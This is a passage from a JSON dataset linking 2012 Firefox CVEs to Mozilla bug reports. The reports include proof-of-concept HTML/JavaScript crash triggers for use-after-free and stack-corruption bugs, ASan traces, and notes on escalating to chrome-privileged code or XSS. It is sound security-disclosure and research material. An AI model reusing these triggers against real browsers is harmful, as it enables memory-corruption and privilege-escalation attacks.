xul!mozilla::imagelib::RasterImage::WriteToDecoder+0x3e [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\rasterimage.cpp @ 2370] 0012cce4 010b9526 xul!mozilla::imagelib::RasterImage::DecodeSomeData+0x35 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\rasterimage.cpp @ 2702] 0012cd3c 010f6ba2 xul!mozilla::imagelib::imgDecodeWorker::Run+0xfe [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\rasterimage.cpp @ 2819] 0012cd50 010f6be3 xul!mozilla::imagelib::RasterImage::AddSourceData+0xcf [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\rasterimage.cpp @ 1496] 0012cda4 0104cfb6 xul!mozilla::imagelib::RasterImage::WriteToRasterImage+0x15 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\rasterimage.cpp @ 2917] 0012cda4 0104cfb6 xul!imgRequest::OnDataAvailable+0x466 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\imgrequest.cpp @ 1166] 0012d004 010f1121 xul!imgRequest::OnDataAvailable+0x466 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\imgrequest.cpp @ 1166] 0012d024 010a7f3a xul!ProxyListener::OnDataAvailable+0x26 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\image\\src\\imgloader.cpp @ 2091] 0012d050 010981c3 xul!nsBaseChannel::OnDataAvailable+0x49 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\netwerk\\base\\src\\nsbasechannel.cpp @ 774] 0012d094 0109807a xul!nsInputStreamPump::OnStateTransfer+0xd3 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\netwerk\\base\\src\\nsinputstreampump.cpp @ 512] 0012d0a8 01097df3 xul!nsInputStreamPump::OnInputStreamReady+0x6d [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\netwerk\\base\\src\\nsinputstreampump.cpp @ 409] 0012d0b8 00fbee5f xul!nsInputStreamReadyEvent::Run+0x1d [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\xpcom\\io\\nsstreamutils.cpp @ 115] 0012d104 100026f5 xul!nsThread::ProcessNextEvent+0x19f [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\xpcom\\threads\\nsthread.cpp @ 666] 0012d144 011bc8e2 nspr4!PR_Unlock+0x25 00000000 00000000 xul!MessageLoop::RunHandler+0x21 [e:\\builds\\moz2_slave\\rel-m-rel-w32-bld\\build\\ipc\\chromium\\src\\base\\message_loop.cc @ 202]"
      }
    ],
    "CVE-2012-3967": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=777028",
        "title": "stack scribbling with 4-byte values choosable among a few values, when using more than 16 sampler uniforms, on Mesa, with all drivers",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 Steps to reproduce: on linux, with decoders asan opt nightly build I loaded: <html> <head> <script id=\"vshader\" type=\"x-shader/x-vertex\"> void main() { vec4 x; gl_Position = x; } </script> <script id=\"fshader\" type=\"x-shader/x-fragment\"> precision mediump float; uniform sampler2D uni[29]; void main() { vec4 c; for (int i = 0; i < 2; i++) { c += texture2D(uni[i], vec2(0)); } } </script> <script> function loadShaderFromScript(gl, name, shaderType) { var shader = gl.createShader(shaderType) var shaderSource = document.getElementById(name).text gl.shaderSource(shader, shaderSource) gl.compileShader(shader) return shader } onload = function() { var gl = document.createElement('canvas').getContext(\"moz-webgl\") var program = gl.createProgram() gl.attachShader(program, loadShaderFromScript(gl, 'vshader', gl.VERTEX_SHADER)) gl.attachShader(program, loadShaderFromScript(gl, 'fshader', gl.FRAGMENT_SHADER)) gl.linkProgram(program) } </script> </head> <body> </body> </html> Actual results: ==7388== ERROR: AddressSanitizer crashed on unknown address 0x7fff00000187 (pc 0x7fffbe4995c8 sp 0x7fffffff43d0 bp 0x7fffb8bc2980 T0) AddressSanitizer can not provide additional info. ABORTING #0 0x7fffbe4995c8 in ?? ??:0 ==18352== ERROR: AddressSanitizer crashed on unknown address 0x000700000007 (pc 0x000700000007 sp 0x7fffffff43d0 bp 0x000700000007 T0) AddressSanitizer can not provide additional info. ABORTING #0 0x700000007 ==29536== ERROR: AddressSanitizer crashed on unknown address 0x7ffffffff000 (pc 0x7fffbe0996a3 sp 0x7fffffff4290 bp 0x7fffb9b69db0 T0) AddressSanitizer can not provide additional info. ABORTING #0 0x7fffbe0996a3 in ?? ??:0 I have seen these three asan outputs, they depend on the number on this line: uniform sampler2D uni[29]; 29 is the lower bound, 65535 is the upper bound."
      }
    ],
    "CVE-2012-3968": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=775852",
        "title": "use after free, webgl fragment shader deleted by accessor",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 Steps to reproduce: loaded the following file: <html> <head> </head> <body> <canvas id=\"cx\"></canvas> <script> function gc() { function gcRec(n) { if (n < 1) return {} var temp = {i: \"ab\" + i + (i / 100000)} temp += \"foo\" gcRec(n-1) } for (var i = 0; i < 1000; i++) { gcRec(10) } } context = cx.getContext(\"moz-webgl\") program = context.createProgram() shader1 = context.createShader(context.VERTEX_SHADER) context.attachShader(program, shader1) Array.prototype.__defineSetter__(0, function() { context.detachShader(program, shader2) context.deleteShader(shader2) shader2 = null gc() }) for (var i = 0; i < 30; ++i) { shader2 = context.createShader(context.FRAGMENT_SHADER) context.attachShader(program, shader2) shaders = context.getAttachedShaders(program) console.dir(shaders[1]) } </script> </body> </html> Actual results: firefox crashed. exception=EXC_BAD_ACCESS:signal=10:is_exploitable=yes:instruction_disassembly=:instruction_address=0x0000000111e82a60:access_type=exec:access_address=0x0000000111e82a60: exception=EXC_BAD_ACCESS:signal=10:is_exploitable=yes:instruction_disassembly=:instruction_address=0x0000000108a99700:access_type=exec:access_address=0x0000000108a99700: ==1901== ERROR: AddressSanitizer heap-use-after-free on address 0x00012c1ac080 at pc 0x10519470a bp 0x7fff5fbf6490 sp 0x7fff5fbf6488 READ of size 8 at 0x00012c1ac080 thread T0 #0 0x10519470a in unsigned int CallQueryInterface<nsISupports, nsWrapperCache>(nsISupports*, nsWrapperCache**) (in XUL) + 170 #1 0x106c2cfbf in bool mozilla::dom::WrapObject<mozilla::WebGLShader>(JSContext*, JSObject*, mozilla::WebGLShader*, nsWrapperCache*, nsID const*, JS::Value*) (in XUL) + 175 0x00012c1ac080 is located 0 bytes inside of 144-byte region [0x00012c1ac080,0x00012c1ac110) freed by thread T0 here: #0 0x10000d095 in (anonymous namespace)::mz_free(_malloc_zone_t*, void*) (in firefox) + 85 #1 0x10000cb10 in wrap_free (in firefox) + 80 #2 0x10519e522 in mozilla::WebGLShader::Release() (in XUL) + 290"
      }
    ],
    "CVE-2012-3969": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=782141",
        "title": "Heap-buffer-overflow in nsSVGFEMorphologyElement::Filter",
        "description": "ASan detected heap-buffer-overflow on opt build f24229bc0ec8."
      }
    ],
    "CVE-2012-3970": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=760996",
        "title": "Heap-use-after-free in nsTArray_base<nsTArrayDefaultAllocator>::Length()",
        "description": "ASan detected use-after-free when running attached test-case. ASan log is for build http://hg.mozilla.org/mozilla-central/rev/12ab69851e05 When testing, was not able to reproduce on Windows 7 x64 - nor stable, neither 15.0a1. Crashes for me only on Linux (Ubuntu 11.10 x64)"
      }
    ],
    "CVE-2012-3971": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=753230",
        "title": "Graphite 2 crash [@graphite2::Silf::readClassMap]",
        "description": "No description provided."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=753623",
        "title": "Graphite 2 crash [@graphite2::Pass::readPass]",
        "description": "No description provided."
      }
    ],
    "CVE-2012-3972": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=746855",
        "title": "[ASan] READ heap-buffer-overflow in format-number()",
        "description": "ASan trace : ==3077== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fafa86aa2dd at pc 0x7fafd761d317 bp 0x7ffff9c0aeb0 sp 0x7ffff9c0aea8 READ of size 1 at 0x7fafa86aa2dd thread T0 #0 0x7fafd761d317 (/home/nicob/Asan/firefox/firefox+0x7fafd761d317) #1 0x7fafd74b0100 (/home/nicob/Asan/firefox/firefox+0x7fafd74b0100) #2 0x7fafd75f8989 (/home/nicob/Asan/firefox/firefox+0x7fafd75f8989) #3 0x7fafd769ed84 (/home/nicob/Asan/firefox/firefox+0x7fafd769ed84) #4 0x7fafdeccc060 (/home/nicob/Asan/firefox/firefox+0x7fafdeccc060) #5 0x7fafdaab5d32 (/home/nicob/Asan/firefox/firefox+0x7fafdaab5d32) [...] 0x7fafa86aa2dd is located 163 bytes to the left of 31-byte region [0x7fafa86aa380,0x7fafa86aa39f) allocated by thread T0 here: #0 0x42cb94 (/home/nicob/Asan/firefox/firefox+0x42cb94) #1 0x7fafeced862e (/home/nicob/Asan/firefox/firefox+0x7fafeced862e) #2 0x7fafd76187f8 (/home/nicob/Asan/firefox/firefox+0x7fafd76187f8) #3 0x7fafd74b0100 (/home/nicob/Asan/firefox/firefox+0x7fafd74b0100) #4 0x7fafd75f8989 (/home/nicob/Asan/firefox/firefox+0x7fafd75f8989) #5 0x7fafd769ed84 (/home/nicob/Asan/firefox/firefox+0x7fafd769ed84) [...] Tested versions : - Firefox 11.0 / Windows XP 3 / x86 - Firefox 12.0a1 / Linux / x64 (public ASan build from https://people.mozilla.com/~choller/firefox/asan/) Note : the offset of the invalid read can be manipulated by modifying the divisor."
      }
    ],
    "CVE-2012-3973": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=757128",
        "title": "Remote debugging is possible even when disabled if netmonitor is enabled",
        "description": "Issue: If remote debugging is disabled, but HTTPMonitor is enabled, a remote user can connect to and use the remote debug service. STR: 1) Enable debugging (not remote) on the target 2) enable HTTPMonitor extension on target 3) From another host, connect remote debugger to <target>:2929 4) enjoy your debugging session Remediation: It would be nice to restrict what's possible based on more than just whether or not a debugger protocol listener is listening. We can discuss some possible ways of doing this."
      }
    ],
    "CVE-2012-3974": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=770478",
        "title": "Installer runs untrusted program",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1 Build ID: 20120614114901 Steps to reproduce: 1. Put program named of the \"program.exe\" in \"C:\\\". 2. Start installing through installer of Firefox. (Select standard install.) 3. Launch Firefox from \"launched Firefox now\". 4. But \"program.exe\" in \"C:\\\" is run. Actual results: The program named of \"program.exe\" in \":C\\\" is run. Expected results: Firefox should be run. FYI, also installer of Thunderbird has this problem."
      }
    ],
    "CVE-2012-3975": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=770684",
        "title": "DOMParser does subresource loads when used from privileged code",
        "description": "If DOMParser parses HTML string to DOM, should not it omit not only script processing but also recourse loading (as the pure XHR does with responseType = \"document\")? I run this code from JavaScript Editor (Scratchpad, in browser context): var parser = new DOMParser(); var xhr = new XMLHttpRequest(); xhr.mozBackgroundRequest = true; xhr.open(\"GET\", \"https://addons.mozilla.org/en-US/firefox/\", true); xhr.timeout = 10000; xhr.channel.loadFlags |= Components.interfaces.nsIRequest.LOAD_BYPASS_CACHE; xhr.onload = function() { var doc = parser.parseFromString(this.responseText, \"text/html\"); var title = doc.evaluate(\"//title\", doc, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; if (title) { alert(title.textContent); } else { alert(\"Parsing error\"); } } xhr.ontimeout = function() { alert(\"Timeout\"); } xhr.onerror = function() { alert(\"HTTP error\"); } xhr.send(null); HttpFox (https://addons.mozilla.org/ru/firefox/addon/httpfox/) shows additional recourse loading. Here some HTTP logs for three sites: Started, Time, Sent, Received, Method, Result, Type, URL https://addons.mozilla.org/en-US/firefox/ 00:00:01.221 1.197 603 316 GET 200 text/html https://addons.mozilla.org/en-US/firefox/ 00:00:02.492 0.171 332 (34312) GET (Cache) text/css https://static-ssl-cdn.addons.mozilla.net/media/css/zamboni/impala-min.css?build=2628081 00:00:02.548 0.143 321 (824) GET (Cache) text/css https://static-ssl-cdn.addons.mozilla.net/media/css/impala/nojs.css?b=78073c4 00:00:02.618 0.464 968 201 GET 303 Redirect to: /dcso6de4r0000082npfcmh4rf_4b1e/njs.gif?dcsredirect=108&dcstlh=1298194945&dcstlv=1298194945&dcsuri=/nojavascript&WT.js=No&WT.tv=8.6.2 https://statse.webtrendslive.com/dcso6de4r0000082npfcmh4rf_4b1e/njs.gif?dcsuri=/nojavascript&WT.js=No&WT.tv=8.6.2 00:00:03.383 0.622 1050 327 GET 200 image/gif https://statse.webtrendslive.com/dcso6de4r0000082npfcmh4rf_4b1e/njs.gif?dcsredirect=108&dcstlh=1298194945&dcstlv=1298194945&dcsuri=/nojavascript&WT.js=No&WT.tv=8.6.2 http://www.urbandictionary.com/ 00:00:02.218 0.163 893 6678 GET 200 text/html http://www.urbandictionary.com/ 00:00:02.470 0.582 844 21059 GET 200 text/css http://static2.urbandictionary.com/rel-30747e0/assets/base-datauri.css 00:00:02.527 0.487 859 8094 GET 200 image/png http://static0.urbandictionary.com/rel-30747e0/images/logo-holiday.png 00:00:02.581 0.461 864 613 GET 200 image/gif http://static2.urbandictionary.com/rel-30747e0/images/left_browse_arrow.gif 00:00:02.639 0.377 865 613 GET 200 image/gif http://static1.urbandictionary.com/rel-30747e0/images/right_browse_arrow.gif 00:00:02.698 0.112 853 (165) GET (Cache) image/gif http://static1.urbandictionary.com/rel-30747e0/images/quotes.gif 00:00:02.756 0.324 352 231 GET 200 image/gif http://pixel.quantserve.com/pixel/p-77H27_lnOeCCI.gif http://www.imdb.com/ 00:00:18.897 0.283 1433 243 GET 200 text/html http://www.imdb.com/ 00:00:19.236 0.339 335 (28286) GET (Cache) text/css http://i.media-imdb.com/images/SF3997b2af7161e82df725bc7ca86f84ce/css/min/consumerhome.css 00:00:19.290 0.448 597 188 GET 302 Redirect to: http://s0.2mdn.net/viewad/817-grey.gif http://ad.doubleclick.net/ad/imdb2.consumer.homepage/;tile=2;sz=1008x150,1008x200,1008x30,9x1;p=t;p=top;ct=com;bpx=1;ab=a;ka=0;ord=717635184750? 00:00:19.344 0.261 346 (96) GET (Cache) text/css http://i.media-imdb.com/images/SF52e6b9f11712d3ec552179f6c869b63a/css2/site/consumer-navbar-no-js.css 00:00:19.396 0.340 582 188 GET 302 Redirect to: http://s0.2mdn.net/viewad/817-grey.gif http://ad.doubleclick.net/ad/imdb2.consumer.homepage/;tile=5;sz=1008x60,1008x66,7x1;p=ns;ct=com;bpx=1;ab=a;ka=0;ord=717635184750? 00:00:19.449 0.288 580 188 GET 302 Redirect to: http://s0.2mdn.net/viewad/817-grey.gif http://ad.doubleclick.net/ad/imdb2.consumer.homepage/;tile=3;sz=300x250,11x1;p=tr;p=tc;ct=com;bpx=1;ab=a;ka=0;ord=717635184750? 00:00:19.504 0.146 425 220 GET 200 image/gif http://b.scorecardresearch.com/p?c1=2&c2=6034961&c3=&c4=http%3A%2F%2Fwww.imdb.com%2F&c5=c6=&15=&cj=1 00:00:19.899 0.418 328 (43) GET (Cache) image/gif http://s0.2mdn.net/viewad/817-grey.gif 00:00:19.957 0.362 328 (43) GET (Cache) image/gif http://s0.2mdn.net/viewad/817-grey.gif 00:00:20.015 0.305 328 ( 43) GET (Cache) image/gif http://s0.2mdn.net/viewad/817-grey.gif Why DOMParser needs these files for just DOM parsing?"
      }
    ],
    "CVE-2012-3976": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=768568",
        "title": "Incorrect EV identity display (loading new page, identity not updated)",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1 Build ID: 20120614114901 Steps to reproduce: I've bin changed form a one https encrypted website to another https encrypted one. Actual results: On the address input box was still the certificate of the first website in green visible Expected results: On the address input box have to be the certificate of the second website"
      }
    ],
    "CVE-2012-3978": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=770429",
        "title": "Bypassing security checks for nsLocation::CheckURL",
        "description": "GetContextFromStack ignores JSContext for ContentFrameMessageManager. If GetContextFromStack ends up not getting a JSContext, nsLocation::CheckURL does not do security checks. This could allow content to load restricted URLs."
      }
    ],
    "CVE-2012-3980": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=771859",
        "title": "Console eval results capable of executing chrome-privileged code",
        "description": "Current release and beta builds vulnerable (13 and 14). 1. Open the attached POC 2. In the Web Console, inspect the paragraph element: > document.getElementById(\"p\"); HUDService.jsm plays it loose with (wrapperless) eval results. JST_execute passes the eval result into formatResult, which allows the content-supplied object to override toSource or toString to return whatever it likes. From there, it hits writeOutputJS and createMessageNode. (Side note: for fun, starting with writeOutputJS, follow the call graph and check out all the places the unsafe aOutputObject can visit: <http://mxr.mozilla.org/mozilla-beta/source/browser/devtools/webconsole/HUDService.jsm#5059>.) If the toSource/toString override returned a DOM node, that node eventually gets inserted into the browser.xul document(!). From there, we can do the ol' \"exploit on* event attributes to run with chrome privileges\". Plausible attack: Take something interesting, like a prouget demo, and insert a variation of this exploit. Use Proxies (those are available to content, right?) to ensure that virtually any expression that the user enters will result in an object with a malicious toSource/toString. This POC doesn't work with Aurora and nightly builds, due to the async console split (bug 673148) and further changes. It's possible that HUDService-content.js is vulnerable, though; I simply haven't looked into it. Sorry for the drive-by and hurried comment. It's late and I have early morning obligations."
      }
    ],
    "CVE-2012-3983": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=634444",
        "title": "Long lines with many warnings from javascript.options.strict cause memory spikes when a console or Firebug is in use",
        "description": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b12pre) Gecko/20110209 Firefox/4.0b12pre ID:20110209030359 We run into a huge memory leak which can also freeze the system, just by performing the following steps: 1. Create a fresh profile and stick the attached users.js file into it 2. Install the latest alpha version of Firebug 1.7 (http://getfirebug.com/releases/firebug/1.7X/firebug-1.7X.0a10.xpi) 3. Open the given URL Within seconds the memory will be filled-up completely and the system can freeze. This is a regression and happened between Beta 7 and Beta 8. I will nail down the regression range tomorrow morning."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=768313",
        "title": "Crash with newGlobal, newContext, --dump-bytecode",
        "description": "./js -m -n -a -D var sandbox = newGlobal(\"same-compartment\"); function inSandbox(code) { evalcx(code, sandbox); }; inSandbox(\"function six() { return 6; }\"); inSandbox(\"evaluate('function qq() { return six(); }', {newContext: true});\"); inSandbox(\"for (j = 0; j <2 ; ++j) { qq(0); }\") -> Crash in mjit code The first \"bad\" revision is: changeset: 648093316d93 user: Jason Orendorff date: Thu May 17 18:54:30 2012 -0500 summary: Bug 755808 - Add more options to JS shell evaluate() function. r=jimb."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=790865",
        "title": "\"Assertion failure: (thing)->compartment()->isCollecting()\" with bfcache, canvas, gcslice",
        "description": "1. Set user_pref(\"javascript.options.mem.gc_incremental\", false); 2. Install https://www.squarefree.com/extensions/domFuzzLite3.xpi 3. Load the testcase. Assertion failure: (thing)->compartment()->isCollecting(), at js/src/gc/Marking.cpp:586 May be related to an intermittent orange, bug 785582."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=762920",
        "title": "Bug 754202 regressed IsCapabilityEnabled",
        "description": "When there is no frame, the result of IsCapabilityEnabled is always true. This is not good since event listeners can be called with no frame."
      }
    ],
    "CVE-2012-3985": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=655649",
        "title": "Script access checks should use effective script origin, not origin",
        "description": "The HTML5 spec requires that browsers raise a SECURITY_ERR exception when members of the Window object (e.g. localStorage) are accessed by scripts that have a different effective script origin. Firefox allows access by scripts that have the same origin OR the same effective script origin. Here's a scenario where the new behavior has an observable security impact: https://attacker.cmu.edu/ wants to access the localStorage of https://weblogin.cmu.edu/. Assume that there exists a page at https://help.weblogin.cmu.edu/ that sets document.domain = 'cmu.edu' and that https://weblogin.cmu.edu/ sets its document.domain to 'weblogin.cmu.edu'. In Chrome/Safari/IE8, I claim that the attacker can't do it. They can inject script into the one help.weblogin.cmu.edu page that set document.domain to 'cmu.edu' but this page can't script other help.weblogin.cmu.edu pages nor can it script weblogin.cmu.edu. In Firefox 4, the attack works. The frame hierarchy looks like this: https://attacker.cmu.edu/ ---> https://help.weblogin.cmu.edu/ ---> https://help.weblogin.cmu.edu/blah ---> https://weblogin.cmu.edu/ The top frame can script the second frame by setting document.domain to 'cmu.edu', the second frame can script the third due to Firefox's non-standard access check, the third frame can script the fourth by setting its document.domain to 'weblogin.cmu.edu' There may be less contrived scenarios; this is what I could come up with after thinking about it for a few minutes. I'm setting the security flag on this bug because I haven't thought through all the ramifications of the new origin enforcement behavior, but it's fine to clear it if you feel the risk is low. Incidentally, this attack also worked in IE7, but for a different reason. IE7 allows 'help.weblogin.cmu.edu' to set its document.domain to 'weblogin.cmu.edu' after setting it to 'cmu.edu'. This was fixed in IE8, which now prohibits setting document.domain to a longer value than its current value. http://www.adambarth.com/papers/2009/barth-weinberger-song.pdf has a great explanation of how to do the HTML5 script access check quickly. The key is to get the access check down to a single pointer comparison in the common case."
      }
    ],
    "CVE-2012-3986": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=775868",
        "title": "several nsDOMWindowUtils methods available to untrusted code",
        "description": "This surfaced when investigating bug 701299, and potential causes for it. Turns out several methods in nsDOMWindowUtils are not protected by security checks, so any webpage can call them. The unprotected methods are at least, but maybe not limited to: GetImageAnimationMode SetImageAnimationMode Redraw ElementFromPoint GetIsMozAfterPaintPending ClearMozAfterPaintEvents GetScrollXY GetIMEIsOpen GetIMEStatus GetFocusedInputType FindElementWithViewId EnterModalState LeaveModalState EnterModalStateWithWindow LeaveModalStateWithWindow IsInModalState GetOuterWindowID GetCurrentInnerWindowID GetLayerManagerType StartFrameTimeRecording StopFrameTimeRecording RenderDocument GetCursorType GetDisplayDPI WrapDOMFile CheckAndClearPaintedState IsIncrementalGCEnabled StartPCCountProfiling StopPCCountProfiling PurgePCCounts GetPCCountScriptCount GetPCCountScriptSummary GetPCCountScriptContents GetPaintingSuppressed Some of those (though not many) are not callable from script (i.e. they take non-scriptable arguments, like JSContext* or what not), so they may be ok, but the majority are not ok. This is trivially fixable by adding IsUniversalXPConnect() checks in all those methods, but that breaks tests, so we need someone to spend some time fixing up the broken tests. I'll add a patch that pretty blindly just adds the checks, but it needs more work, and I've utterly failed to find the time to fix this up, so someone else needs to take this over... Andrew, maybe you can take a stab at driving this in? Guessing that this is sg:critical, mostly because of the shear number of unknowns here."
      }
    ],
    "CVE-2012-3987": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=778582",
        "title": "reader mode chrome xss",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1 Build ID: 20120713134347 Steps to reproduce: Reader mode copies the article into a document with chrome privileges via innerHTML without doing much sanitization. http://mxr.mozilla.org/mozilla-central/source/mobile/android/chrome/content/aboutReader.js?force=1#294"
      }
    ],
    "CVE-2012-3988": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=725770",
        "title": "Firefox crashes by mozRequestFullScreen and history.back function",
        "description": "User Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.46 Safari/535.11 Steps to reproduce: When history.length is greater than 1 (back button is enabled) and user initiate the click button: Calling the \"mozRequestFullScreen()\" function and then \"history.go(-1)\" can cause a crash or a DoS in Mozilla Firefox. I have created a test case that will replicate the issue. As the Offset value can change, it can be a security issue as well. However, I could not find out the reason for this offset change. Please also verify if it can be a case for the bug bounty. Actual results: Mozilla Firefox show the crash reporter Or It becomes unresponsive If you cannot see this result, please use the provided attach file and do it again. Note: Your history should not be empty. Expected results: It should disable the full screen and then redirect the user to the previous page."
      }
    ],
    "CVE-2012-3989": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=783867",
        "title": "ASSERTION: This only works on nsISupports classes! and segfault",
        "description": "Running new Worker(\"http://base.com\") instanceof Components.interfaces.nsIArray in a mochitest will hit NS_ASSERTION(mozilla::dom::DOMJSClass::FromJSClass( js::GetObjectJSClass(obj))->mDOMObjectIsISupports, \"This only works on nsISupports classes!\"); at <http://mxr.mozilla.org/mozilla-central/source/js/xpconnect/src/XPCJSID.cpp#484>. We then unwrap the object to nsISupports and try to call QueryInterface on it, and segfault in nsWrapperCache::WrapObject."
      }
    ],
    "CVE-2012-3990": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=787704",
        "title": "use-after-free in nsIContent::GetNameSpaceID",
        "description": "when I load: <html> <head> <style> .c0 { content:'A' } </style> <script> onload = function() { document.body.appendChild(document.createElement('td')) el0=document.createElement('div') document.body.appendChild(el0) el1=document.createElement('form') document.body.appendChild(el1) el2=document.createElement('input') el2.setAttribute('type', 'submit') el1.appendChild(el2) el3=document.createElement('input') el3.setAttribute('required', 'A') el1.appendChild(el3) el4=document.createElement('input') el4.type='file' el1.appendChild(el4) setTimeout(function() { el4.focus() setTimeout(function() { el4.click() el2.setAttribute('required', 'A') el0.setAttribute('class', 'c0') setTimeout(function() { document.designMode='on' document.execCommand('italic') document.designMode='off' setTimeout(function() { el2.click() }, 100) }, 100) }, 100) }, 100) } </script> </head> <body> </body> </html> I get a crash like so: ==24180== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffbe11ac98 at pc 0x7fffeeb97d74 bp 0x7ffffffedd70 sp 0x7ffffffedd68 READ of size 8 at 0x7fffbe11ac98 thread T0 #0 0x7fffeeb97d74 in nsIContent::GetNameSpaceID() const /builds/slave/try-lnx64/build/../../../dist/include/nsINodeInfo.h:143 #1 0x7fffee6f9a37 in nsCOMPtr<nsIDOMEventTarget>::operator=(nsCOMPtr<nsIDOMEventTarget> const&) /builds/slave/try-lnx64/build/../../../../dist/include/nsCOMPtr.h:614 #2 0x7fffee6fe5fb in nsXULPopupManager::ShowPopupCallback(nsIContent*, nsMenuPopupFrame*, bool, bool) /builds/slave/try-lnx64/build/layout/xul/base/src/nsXULPopupManager.cpp:716 #3 0x7fffee6fc7a2 in nsXULPopupManager::FirePopupShowingEvent(nsIContent*, bool, bool) /builds/slave/try-lnx64/build/layout/xul/base/src/nsXULPopupManager.cpp:1181 #4 0x7fffee6fcf36 in nsXULPopupManager::ShowPopup(nsIContent*, nsIContent*, nsAString_internal const&, int, int, bool, bool, bool, nsIDOMEvent*) /builds/slave/try-lnx64/build/layout/xul/base/src/nsXULPopupManager.cpp:568 #5 0x7fffee691040 in non-virtual thunk to nsPopupBoxObject::OpenPopup(nsIDOMElement*, nsAString_internal const&, int, int, bool, bool, nsIDOMEvent*) /builds/slave/try-lnx64/build/../../../../dist/include/nsCOMPtr.h:407 0x7fffbe11ac98 is located 24 bytes inside of 368-byte region [0x7fffbe11ac80,0x7fffbe11adf0) freed by thread T0 here: #0 0x42ae21 in free ??:0 #1 0x7fffee92a335 in nsNodeUtils::LastRelease(nsINode*) /builds/slave/try-lnx64/build/content/base/src/nsNodeUtils.cpp:261 #2 0x7fffee9ff963 in mozilla::dom::FragmentOrElement::Release() /builds/slave/try-lnx64/build/content/base/src/FragmentOrElement.cpp:1853 #3 0x7fffef02ebc4 in nsGlobalWindow::SetFocusedNode(nsIContent*, unsigned int, bool) /builds/slave/try-lnx64/build/dom/base/nsGlobalWindow.cpp:7765 #4 0x7fffeefc93be in nsFocusManager::SetFocusInner(nsIContent*, int, bool, bool) aurora and nightly affected atleast."
      }
    ],
    "CVE-2012-3991": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=783260",
        "title": "Error: Error: Permission denied to access property 'toString' when open certain site",
        "description": "This appears in Aurora16.0a2 and Nightly17.0a1. (The appearance of the page does not seem to have the problem in particular.) Step To Reproduce: 1. Load http://ww2.noticiasmvs.com/entrevistas/primera-emision-con-carmen-aristegui/postura-de-mvs-sobre-rescate-banda-25-ghz-conferencia-de-prensa-139.html Actual Results: The following error shown in Error Console Error: Permission denied to access property 'toString"
      }
    ],
    "CVE-2012-3992": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=775009",
        "title": "History state error with late navigation involving a hash change",
        "description": "Docshell is still vulnerable to the history state issue described in bug 757376 if the write to location.hash is substituted for a history navigation involving a hash change. Suppose the history object is in the following state: [0]: http://attacker [1]: http://attacker#hash (active) [2]: http://victim Calling history.forward and history.back in a rapid succession will cause the targeted website to load into the existing session history entry 0: [0]: http://attacker (active) [1]: http://attacker#hash [2]: http://victim A subsequent call to history.forward changes |baseURI|, which allows the attacker to inject a script loaded from a relative path (XSS) or intercept data posted to a location specified with a relative path."
      }
    ],
    "CVE-2012-3993": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=768101",
        "title": "XrayWrapper pollution via unsafe COW",
